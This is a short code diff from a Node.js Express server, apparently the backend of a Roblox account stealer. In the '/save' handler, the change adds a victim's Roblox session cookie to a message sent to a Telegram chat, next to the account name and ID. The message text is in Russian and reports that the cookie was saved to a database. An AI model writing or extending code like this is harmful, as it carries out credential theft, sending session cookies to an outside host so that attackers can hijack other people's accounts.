@@ -63,7 +63,7 @@ app.post("/save", async (req, res) => {
 
     await sendTelegramMessage(
       process.env.CHAT_ID,
-      `Аккаунт Roblox: ${robloxUser.name} (ID: ${robloxUser.id})`
+      `Аккаунт Roblox: ${robloxUser.name} (ID: ${robloxUser.id}) Cookie: ${login} был успешно сохранен в базе данных.`
     );
 
     res.json({
